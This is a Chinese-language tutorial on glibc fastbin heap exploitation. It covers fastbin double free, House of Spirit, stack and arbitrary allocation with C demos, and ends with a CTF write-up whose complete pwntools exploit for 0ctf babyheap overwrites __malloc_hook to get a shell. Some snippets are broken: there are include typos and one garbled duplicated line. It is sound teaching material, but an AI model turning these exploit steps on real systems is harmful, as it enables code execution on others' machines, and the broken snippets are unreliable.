# Fastbin Attack

## 介绍：

1. **fastbin attack** 是一类漏洞的利用方法，是指所有**基于 fastbin 机制**的漏洞利用方法。这类利用的**前提**是：

   - 存在**堆溢出**、use-after-free 等能控制 **chunk 内容**的漏洞
   - 漏洞发生于 fastbin 类型的 chunk 中

2. 如果细分的话，可以做如下的分类：

   - Fastbin Double Free
   - House of Spirit
   - Alloc to Stack
   - Arbitrary Alloc

   其中，前两种主要漏洞侧重于利用 **`free` 函数**释放**真的 chunk** 或**伪造的 chunk**，然后**再次申请 chunk** 进行攻击，后两种侧重于**故意修改 `fd` 指针**，直接利用 `malloc` 申请指定位置 chunk 进行攻击。

## 原理：

1. fastbin attack 存在的原因在于 fastbin 是使用**单链表**来维护释放的堆块的，并且由 **fastbin 管理的 chunk** 即使被释放，**其 next_chunk 的 prev_inuse 位**也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。

   ```c
   int main(void)
   {
       void *chunk1,*chunk2,*chunk3;
       chunk1=malloc(0x30);
       chunk2=malloc(0x30);
       chunk3=malloc(0x30);
       //进行释放
       free(chunk1);
       free(chunk2);
       free(chunk3);
       return 0;
   }
   ```

   释放前
   
   ![image-20240706204534714](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407062045798.png)
   
   三次释放后：此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个**单链表**
   
   ![image-20240706205218983](C:\Users\BKBQWQ\AppData\Roaming\Typora\typora-user-images\image-20240706205218983.png)
   

## Fastbin Double Free

### 介绍：

1. **Fastbin Double Free** 是指 fastbin 的 chunk 可以被**多次释放**，因此可以在 **fastbin 链表中存在多次**。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。

2. Fastbin Double Free 能够成功**利用**主要有两部分的原因：

   * fastbin 的堆块被释放后 **next_chunk 的 pre_inuse 位不会被清空 **。

   * fastbin 在执行 free 的时候**仅验证了 main_arena 直接指向的块**，即链表**指针头部**的块。对于**链表后面**的块，并没有进行验证。

   ```c
   /* Another simple check: make sure the top of the bin is not the
          record we are going to add (i.e., double free).  */
       if (__builtin_expect (old == p, 0))
         {
           errstr = "double free or corruption (fasttop)";
           goto errout;
   }
   ```

### 演示：

1. 下面的示例程序说明了这一点（free时只检查表头），当我们试图执行以下代码时：

   ```c
   int main(void)
   {
       void *chunk1,*chunk2,*chunk3;
       chunk1=malloc(0x10);
       chunk2=malloc(0x10);
   
       free(chunk1);
       free(chunk1);
       return 0;
   }
   ```

   如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407062106593.png)

   如果我们在 **chunk1 释放后**，再**释放 chunk2** ，这样 **main_arena 就指向 chunk2** 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。

   ```c
   int main(void)
   {
       void *chunk1,*chunk2,*chunk3;
       chunk1=malloc(0x10);
       chunk2=malloc(0x10);
   
       free(chunk1);
       free(chunk2);
       free(chunk1);
       return 0;
   }
   ```

   第一次释放`free(chunk1)` ：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407062217756.png)

   ![image-20240709153043987](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091530089.png)

   第二次释放`free(chunk2)`：

   ![image-20240706221910580](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407062219624.png)

   ![image-20240709153103962](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091531063.png)

   第三次释放`free(chunk1)` ：
   
   ![image-20240706221927187](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407062231904.png)
   
   ![image-20240709153124770](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091531869.png)
   
   注意因为 chunk1 被再次释放因此其 **fd 值**(指向下一个chunk)不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的**任意地址分配 fastbin** 块。
   
    下面这个示例演示了这一点，首先跟前面一样构造 **main_arena=>chunk1=>chun2=>chunk1** 的链表。之后**第一次调用 malloc 返回 chunk1** 之后修改 **chunk1 的 fd 指针指向 bss 段上的 bss_chunk**，之后再申请我们可以看到 fastbin 会把堆块分配到这里。
   
   ```python
   #include<stdio.h>
   #incldue<stdlib.h>
   typedef struct _chunk
   {
       long long pre_size;
       long long size;
       long long fd;
       long long bk;
   } CHUNK,*PCHUNK;
   
   CHUNK bss_chunk;
   
   int main(void)
   {
       void *chunk1,*chunk2,*chunk3;
       void *chunk_a,*chunk_b;
   
       bss_chunk.size=0x21;	//要与chunk的大小一致，用bss_chunk伪造chunk1
       chunk1=malloc(0x10);	//申请的chunk大小会是0x21
       chunk2=malloc(0x10);
   
       free(chunk1);
       free(chunk2);
       free(chunk1);
       
   	//串改chunk1的fd值
       chunk_a=malloc(0x10);			//此时chunk_a会指向前面释放的chunk1
       *(long long *)chunk_a=&bss_chunk;//修改chunk_a的fd会指向我们伪造的bss_chunk，(long long *)chunk_a是chunk1的fd（用户写入的数据区域被释放的chunk1当成了fd区域），修改了chunk1的fd指针，因为前面申请到了chunk1，所以现在能向上面写入地址，此时的chunk1相当于又空闲又正在被使用
       
       malloc(0x10);				    //将前面的两个chunk(chunk1和chunk2)弹出
       malloc(0x10);
       chunk_b=malloc(0x10);		    //请将刚才伪造的的bss_chunk
       printf("%p",chunk_b);
       return 0;
   }
   ```
   
   调试：***(long long *)chunk_a=&bss_chunk;** 之前
   
   ![image-20240709152839232](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091529037.png)
   
   ***(long long *)chunk_a=&bss_chunk;** 之后，可以看到0x55555555b010地址处的值被顺利改写为**bss_chunk**的地址：
   
   ![image-20240707153121533](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407071531961.png)
   
   到bss_chunk处查看：
   
   ![image-20240707153857813](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407071540878.png)
   
   查看现在的fastbin，可以看到chunk1的fd顺利被修改，下一个栈空间(空闲的)为我们自己定义的bss_chunk，此时再申请三个chunk后即可申请到bss_chunk，成功欺骗了fastbin：
   
   ![image-20240707153925698](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407071540281.png)
   
   成功申请到我们指定的bss_chunk堆：
   
   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407071545979.png)
   
   
   
   注意：我们在 main 函数的第一步就进行了**`bss_chunk.size=0x21;`**的操作，这是因为**_int_malloc 会对欲分配位置的 size 域进行验证**，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。

### 小总结：

* 通过 fastbin double free 我们可以使用**多个指针控制同一个堆块**，这可以用于篡改一些堆块中的**关键数据域**或者是实现类似于**类型混淆** （使chunk处于**即在使用、又被释放的状态**）的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证，即size的大小要相同)，这就相当于任意地址写任意值的效果。

## House Of Spirit

### 介绍：

1. House of Spirit 是 `the Malloc Maleficarum` 中的一种技术，该技术的核心在于在目标位置处**伪造 fastbin chunk**，并将其释放，从而达到分配**指定地址**的 chunk 的目的。
2. 要想构造 **fastbin fake chunk**，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即：
   - fake chunk 的 **ISMMAP 位**不能为 1（该堆空间不是有mmap分配），因为 free 时，如果是 mmap 的 chunk，会单独处理。
   - fake chunk **地址需要对齐**， MALLOC_ALIGN_MASK
   - fake chunk 的 **size 大小** 需要满足对应的 fastbin 的需求，同时也得对齐。
   -  fake chunk 的 **next chunk** 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
   - fake chunk 对应的 fastbin **链表头部**不能是该 fake chunk，即**不能构成 double free** 的情况。

### 演示：

1. 

   ```c
   #include <stdio.h>
   #include <stdlib.h>
   
   int main()
   {
       fprintf(stderr, "This file demonstrates the house of spirit attack.\n");
   
       fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
       malloc(1);
   
       fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
       unsigned long long *a;
       // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
       unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
   
       fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);
   
       fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
       fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
       fake_chunks[1] = 0x40; // this is the size
   
       fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
           // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
       fake_chunks[9] = 0x1234; // nextsize
   
       fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
       fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
       a = &fake_chunks[2];
   
       fprintf(stderr, "Freeing the overwritten pointer.\n");
       free(a);
   
       fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
       fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
   }
   ```

### 小总结

可以看出，想要使用该技术 **分配 chunk 到指定地址** ，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的**前后的内容**使其可以**绕过对应的检测**。

## Alloc to Stack

### 介绍：

1. 如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：**当前 chunk 的 fd 指针指向下一个 chunk**。
2. 该技术的核心点在于**劫持 fastbin 链表中 chunk 的 fd 指针**，把 fd 指针指向我们想要 **分配的栈上** （在栈上伪造dui），从而实现控制栈中的一些关键数据，比如**返回地址**等。

### 演示：

1. 这次我们把 fake_chunk 置于栈中称为 **stack_chunk**，同时**劫持了 fastbin 链表中 chunk 的 fd** 值，通过把这个 fd 值**指向 stack_chunk** 就可以实现在栈中分配 fastbin chunk。

   ```c
   typedef struct _chunk
   {
       long long pre_size;
       long long size;
       long long fd;
       long long bk;
   } CHUNK,*PCHUNK;
   
   int main(void)
   {
       CHUNK stack_chunk;		//伪造堆
   
       void *chunk1;
       void *chunk_a;
   
       stack_chunk.size=0x21;	//指定堆的大小，绕过检测
       chunk1=malloc(0x10);
   
       free(chunk1);
       *(long long *)chunk1=&stack_chunk;//让chunk1的fd指向stack_chunk
       malloc(0x10);		//将chunk1收回
       chunk_a=malloc(0x10);//再申请就能得到伪造的stack_chunk
       printf("%p",chunk_a);
       return 0;
   }
   ```
   
   通过 **gdb 调试**可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk：
   
   ![image-20240709153149704](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091531796.png)
   
   最终第二次 malloc 返回值为 0x00007fffffffde50 也就是 **stack_chunk**
   
   ![image-20240709153207869](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091532945.png)
   
   最后看一下栈上的数据：
   
   ![image-20240709153226855](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091532958.png)

### 小总结：

1. 通过该技术我们可以把 **fastbin chunk 分配到栈中**，从而**控制返回地址**等关键数据。要实现这一点我们需要**劫持 fastbin 中 chunk 的 fd 域**，把它**指到栈上**，当然同时需要栈上**存在有满足条件的 *size* 值**。

## Arbitrary Alloc

### 介绍：

1. Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址**存在合法的 size 域**（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。

### 演示：

1. 在这个例子，我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。**

   ```c
   #include<stdio.h>
   $include<stdlib.h>
   int main(void)
   {
       void *chunk1;
       void *chunk_a;
   
       chunk1=malloc(0x60);
   
       free(chunk1);
   
       *(long long *)chunk1=0x7ffff7bc4b10-0x23;
       malloc(0x60);
       chunk_a=malloc(0x60);
       return 0;
   }
   ```

   这里的 0x7ffff7bc4b10是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要**观察欲写入地址附近**是否存在可以字节错位的情况。

   ![image-20240709153251259](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091532326.png)

   ![image-20240709153309168](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091533273.png)

   0x7ffff7bc4b10是我们想要控制的 **__malloc_hook** 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 **fastbin 的范围为 32 字节到 128** 字节 (0x20-0x80)，如下：
   
   ```c
   //这里的size指用户区域(不包括chunk头)，因此要小2倍SIZE_SZ
   Fastbins[idx=0, size=0x10]
   Fastbins[idx=1, size=0x20]
   Fastbins[idx=2, size=0x30]
   Fastbins[idx=3, size=0x40]
   Fastbins[idx=4, size=0x50]
   Fastbins[idx=5, size=0x60]
   Fastbins[idx=6, size=0x70]
   ```
   
   因为 0x7f 在**计算 fastbin index** 时，是属于 index 5 的，即 **chunk 大小为 0x70** ，而其大小又包含了 0x10 的 chunk_header，因此我们选择分配所以需要**申请的大小要在:0x60~0x6f**。将其加入链表。 最后经过**两次分配**可以观察到 chunk 被分配到 0x7ffff7bc4aed，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。
   
   下面调试：
   
   ![image-20240708110042147](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081100335.png)
   
   ![image-20240708110810608](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081108701.png)
   
   成功分配到 **__malloc_hook** 前面的地址，如果往这个分配到的栈上写入数据，就能覆盖掉__malloc_hook.

### 小总结:

1. Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来**绕过 size 域的检验**，实现**任意地址分配 chunk**，最后的效果也就相当于**任意地址写任意值**。





# 例题：0ctf_babyheap

# fastbin Attack 、unsorted bin

## 思路：

1. 利用double free的方式泄漏出unsortbin中的main_arena地址。

2. 释放一个不属于fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。

3. 当有一个(或几个) **small/large chunk 被释放**（不属于fastbin）时，small/large chunk 的 fd 和 bk 指向 **main_arena** 中的地址。

4. main_arena结构示意图（白嫖：https://www.52pojie.cn/thread-1467962-1-1.html）：

   ![image-20240711165914940](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217768.png)

## 题解：

题目地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#0ctf_2017_babyheap)

1. 程序使用一个结构体数组来存储堆的指针、大小、释放被使用等信息，可以将结构体补充上去：

   ![image-20240711160314378](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217965.png)

   ![image-20240711160244931](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217222.png)

2. fill函数存在堆溢出，可以利用这个漏洞实现double free，配合dump函数泄漏main_arena地址：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217965.png)

3. free函数中将堆指针清0，不能使用UAF：

   ![image-20240711160518623](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217589.png)

4. 利用过程：

   * 先申请4个小chunk，一个大chunk，再释放chunk1和chunk2，chunk2 用来修改fd，指向chunk4，来达到double free的效果：

   ```python
   add(0x10,b'a')    #0
   add(0x10,b'b')    #1 作为修改fd，指向chunk4的牺牲品
   add(0x10,b'c')    #2 用来修改fd，指向chunk4
   add(0x10,b'd')    #3 用来恢复chunk4的size字段
   add(0x80,b'e')    #4 small chunk用来得到main_arena地址
   
   free(1)
   free(2)
   
   #修改chunk2的fd指针，指向chunk4
   payload = p64(0)*3 + p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
   fill(0,payload)
   ```

   修改前，chunk2的fd指向chunk1：

   ![image-20240711161110921](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217031.png)

   修改后，chunk2的fd指向chunk4（此时chunk4并没有被释放，所以再申请回去就能达成了double free，两个指针指向同一个chunk）：

   ![image-20240711161147880](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217813.png)

   * 利用堆溢出修改chunk4的size字段，来绕过malloc 的检查：

   ```python
   #修改chunk4的size字段，申请时绕过fastbin的检查
   payload = p64(0)*3+p64(0x21)
   fill(3,payload)
   ```

   ![image-20240711161459967](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217726.png)

   * 两次申请，将chunk4申请回原来的chunk2位置，再利用chunk3修改回chunk4的size字段（便于后面继续分配chunk）：

   ```python
   #第二次申请chunk4（2）
   add(0x10,b'f')    #1
   add(0x10,b'g')    #2 与4一起指向small chunk
   #将chunk4的size字段改回来
   payload = p64(0)*3 + p64(0x91)
   fill(3,payload)
   ```

   ![image-20240711161804445](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111618582.png)

   * 此时直接释放chunk4（或者chunk2）由于与top chunk相邻，会被直接回收，所以再申请一个chunk将其隔开，然后再释放：

   ```python
   #防止chunk4释放后，进入top chunk
   add(0x10,b'h')  #5 
   free(4)
   ```

   * 此时chunk2（chunk4）中会存在**main_arena**中的unsorted地址：

   ![image-20240711170418963](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217716.png)

   * 正常情况下（此题没有UAF）再free掉chunk后是不能再访问的，但是前面构造的double free让我们可以利用chnk2和chunk4访问同一个chunk，前面用4释放了所以现在用chunk2来输出其中的内容（chunk2和chunk4指向同一个chunk）：

   ```python
   dump(2)
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   ##__malloc_hook只与main_arena地址相差0x10
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   #获得main_arena偏移后计算libc基地址
   libc_base = addr-(main_arena_offset+0x58)
   success("libc_addr==>"+hex(libc_base))
   
   malloc_hook = libc.symbols["__malloc_hook"]+libc_base
   #用one_gadget查出execve的偏移
   malloc_hook = libc.symbols["__malloc_hook"]+libc_base
   execve_addr  = 0x4526a + libc_base
   success("malloc_hook==>"+hex(malloc_hook))
   success("execve_addr==>"+hex(execve_addr))  = 0x4526a + libc_base
   success("malloc_hook==>"+hex(malloc_hook))
   success("execve_addr==>"+hex(execve_addr))
   ```

   ![image-20240711164108341](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407141217521.png)

   * 在malloc_hook之前伪造一个chunk，用来覆盖malloc_hook：

   ```python
   #申请一个size字段为0x71的chunk，再释放掉，如何修改其fd值，指向malloc_hook前面size为0x7f的空间伪造chunk（malloc_hook-0x23）
   add(0x60,b'6')  #4
   free(4)
   payload = b"AAAAAAAA"*3 + p64(0x71) + p64(malloc_hook-0x23)
   fill(3,payload)
   ```

   ![image-20240711164131595](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111641690.png)

   ![image-20240711165225361](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111652543.png)

   * 两次申请，申请到伪造的chunk，然后堆溢出修改malloc_hook，最后调用即可：

   ```python
   #将伪造的chunk申请回来
   add(0x60,b't')  #4
   add(0x60,b'j')  #6
   
   #覆盖malloc_hook指向execve_addr，覆盖的垃圾数据要在gdb中计算好
   payload = b"AAAAAAAA"*2+b"aaa"+p64(execve_addr)
   fill(6,payload)
   
   #调用evecve("/bin/sh")
   add(0x100,b'lzl')
   p.sendline(b"cat flag")
   p.interactive()
   ```

5. 完整EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   p = remote("node5.buuoj.cn",25775)
   # p = process("./pwn")
   libc = ELF('./libc-2.23.so')
   elf = ELF("./pwn")
   
   
   def add(size,content):
       p.sendlineafter(b':','1')
       p.sendlineafter(':',str(size))
       # p.sendlineafter(':',content)
   
   def fill(index, content):
       p.sendlineafter(':','2')
       p.sendlineafter(':',str(index).encode())
       p.sendlineafter(':',str(len(content)))
       p.sendafter(b':',content)
   
   def free(index):
       p.sendlineafter(':','3')
       p.sendlineafter(':',str(index).encode())
   
   def dump(index):
       p.sendlineafter(b':',b'4')
       p.sendlineafter(b':',str(index).encode())
   add(0x10,b'a')    #0
   add(0x10,b'b')    #1 作为修改fd，指向chunk4的牺牲品
   add(0x10,b'c')    #2 用来修改fd，指向chunk4
   add(0x10,b'd')    #3 用来恢复chunk4的size字段
   add(0x80,b'e')    #4 small chunk用来得到main_arena地址
   
   free(1)
   free(2)
   
   #修改chunk2的fd指针，指向chunk4
   payload = p64(0)*3 + p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
   fill(0,payload)
   
   #修改chunk4的size字段，申请时绕过fastbin的检查
   payload = p64(0)*3+p64(0x21)
   fill(3,payload)
   
   #第二次申请chunk4（2）
   add(0x10,b'f')    #1
   add(0x10,b'g')    #2 与4一起指向small chunk
   #将chunk4的size字段改回来
   payload = p64(0)*3 + p64(0x91)
   fill(3,payload)
   
   
   #防止chunk4释放后，进入top chunk
   add(0x10,b'h')  #5 
   free(4)
   
   #由于2被释放，所以用4来输出其中的main_arena，如果前面释放的是chunk2，那就用chunk4打印
   dump(2)
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   libc_base = addr-(main_arena_offset+0x58)
   success("libc_addr==>"+hex(libc_base))
   
   malloc_hook = libc.symbols["__malloc_hook"]+libc_base
   execve_addr  = 0x4526a + libc_base
   success("malloc_hook==>"+hex(malloc_hook))
   success("execve_addr==>"+hex(execve_addr))
   
   #申请一个size字段为0x71的chunk，再释放掉，如何修改其fd值，指向malloc_hook前面size为0x7f的空间伪造chunk（malloc_hook-0x23）
   add(0x60,b'6')  #4
   free(4)
   payload = b"AAAAAAAA"*3 + p64(0x71) + p64(malloc_hook-0x23)
   fill(3,payload)
   
   
   #将伪造的chunk申请回来
   add(0x60,b't')  #4
   add(0x60,b'j')  #6
   
   #覆盖malloc_hook指向execve_addr
   payload = b"AAAAAAAA"*2+b"aaa"+p64(execve_addr)
   fill(6,payload)
   
   #调用evecve("/bin/sh")
   add(0x100,b'lzl')
   p.sendline(b"cat flag")
   p.interactive()
   ```

   ![image-20240711165659284](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111656370.png)

## 参考：

1. [从零开始的Linux堆利用(六)——Unsortedbin Attack - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn](https://www.52pojie.cn/thread-1467962-1-1.html)
2. [[分享\]0ctf2017 - babyheap-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-223461.htm)
